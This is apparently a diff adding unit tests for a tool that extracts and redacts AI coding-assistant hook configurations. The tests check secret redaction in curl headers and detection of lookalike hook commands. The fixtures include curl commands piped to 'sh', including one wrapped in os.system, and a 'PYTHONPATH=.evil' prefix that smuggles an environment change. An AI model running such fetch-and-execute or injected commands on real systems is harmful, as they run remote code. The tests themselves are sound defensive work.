@@ -306,6 +306,15 @@ class TestExtractHooks(unittest.TestCase):
         for line in code:
             self.assertEqual(redact_secrets(line), line)
         self.assertEqual(redact_secrets(r"python -u C:\hooks\audit.py"), r"python -u C:\hooks\audit.py")
+        for line, secret in ((r'curl -H "Authorization: Bearer \"escbearer\"" https://x', "escbearer"),
+                             (r'curl -H "Cookie: \"session=esccookie\"" https://x', "esccookie"),
+                             (r'curl -H "X-Api-Key: \"eschdr\"" https://x', "eschdr"),
+                             ("""curl -H 'Authorization: Bearer '"joinedbearer" https://x""", "joinedbearer")):
+            self.assertNotIn(secret, redact_secrets(line), line)
+        # Redaction never removes the pipe that a remote-code check on the server looks for.
+        for line in ('curl -H "X-Api-Key: hdrkey" https://x | sh',
+                     r'os.system("curl -H \"Authorization: Bearer t0ken\" https://x | sh")'):
+            self.assertTrue(redact_secrets(line).endswith(line[line.index(" https://x"):]), line)
 
     def test_redaction_stays_fast_on_hostile_input(self):
         start = time.monotonic()  # scripts are capped at MAX_SCRIPT_SIZE and commands lower, so that is the worst input
@@ -434,6 +443,12 @@ class TestExtractHooks(unittest.TestCase):
                 {"command": f"python3 {self.home}/audit.py {self.home}/.copilot/hooks/unbound.py", "scope": "user",
                  "script_path": str(self.home / "audit.py")}]}]}
             self.assertTrue(_has_user_owned_data("GitHub Copilot CLI", argument, self.home))  # runs audit.py, not Unbound's
+            for command, script in (("python3 ~/work/.copilot/hooks/unbound.py", self.home / "work/.copilot/hooks/unbound.py"),
+                                    ("./python3 ~/.copilot/hooks/unbound.py", self.home / ".copilot/hooks/unbound.py"),
+                                    ("PYTHONPATH=.evil python3 ~/.copilot/hooks/unbound.py", self.home / ".copilot/hooks/unbound.py")):
+                lookalike = {"projects": [{"path": str(self.home), "hooks": [
+                    {"command": command, "scope": "user", "script_path": str(script)}]}]}
+                self.assertTrue(_has_user_owned_data("GitHub Copilot CLI", lookalike, self.home), command)
         self.assertEqual(sorted(h["command"] for h in owned["projects"][0]["hooks"]), ["echo mdm", "echo policy"])
         self.assertEqual([h["command"] for p in augment["projects"] for h in p.get("hooks", [])], ["echo policy"])
 
